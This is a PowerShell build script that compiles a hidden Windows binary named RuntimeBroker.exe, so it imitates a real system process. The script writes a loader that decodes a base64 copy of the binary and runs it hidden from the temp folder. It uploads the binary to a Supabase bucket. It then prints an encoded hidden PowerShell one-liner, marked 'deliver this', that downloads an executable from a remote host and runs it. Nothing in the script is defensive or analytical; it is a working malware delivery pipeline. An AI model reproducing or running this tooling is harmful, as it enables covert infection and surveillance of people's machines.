powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
if (!$?) { Write-Output "Config encryption failed"; exit 1 }

windres version.rc -O coff -o version.res
if (!$?) { Write-Output "Resource compilation failed"; exit 1 }

g++ -Os -s -mwindows monitor.cpp version.res -lwinhttp -lcrypt32 -o RuntimeBroker.exe
if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }

# Remove-Item -Force version.res -ErrorAction SilentlyContinue
# upx --ultra-brute RuntimeBroker.exe

# Generate loader.ps1 (fileless delivery)
$exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$b64 = [Convert]::ToBase64String($exeBytes)
$loader = @"
`$d = "$b64"
`$p = "`$env:TEMP\RuntimeBroker.exe"
[IO.File]::WriteAllBytes(`$p, [Convert]::FromBase64String(`$d))
Start-Process -WindowStyle Hidden `$p
"@
Set-Content -Path "loader.ps1" -Value $loader

# Upload to Supabase Storage + print one-liner
$sbUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co"
$envConfig = @{}
Get-Content "config.env" | Where-Object { $_ -match '^(\w+)=(.+)' } | ForEach-Object {
    $envConfig[$matches[1]] = $matches[2]
}
$svKey = $envConfig["SUPABASE_SERVICE_KEY"]
$headers = @{ "apikey" = $svKey; "Authorization" = "Bearer $svKey" }
$bucket = "Netpen"
$object = "RuntimeBroker.exe"

# Upload exe to Supabase Storage (one-liner delivery)
$exeData = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$uploadHeaders = $headers.Clone()
$uploadHeaders["Content-Type"] = "application/octet-stream"
$uploadHeaders["x-upsert"] = "true"
try {
    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/$object" -Method Put -Headers $uploadHeaders -Body $exeData -ErrorAction Stop | Out-Null
    Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
    Write-Output ""
    Write-Output "=== ONE-LINER (deliver this) ==="
    $rawCmd = "iwr 'https://allseeing.netlify.app/a' -OutFile `$env:tmp\a.exe; start `$env:tmp\a.exe"
    $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
    $encCmd = [Convert]::ToBase64String($encBytes)
    Write-Output "powershell -w h -Enc $encCmd"
    Write-Output "=================================="
} catch {
    Write-Output ""
    Write-Output "=== UPLOAD FAILED ==="
    Write-Output "Check the error above"
    Write-Output "====================="
    Write-Output ""
}

Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
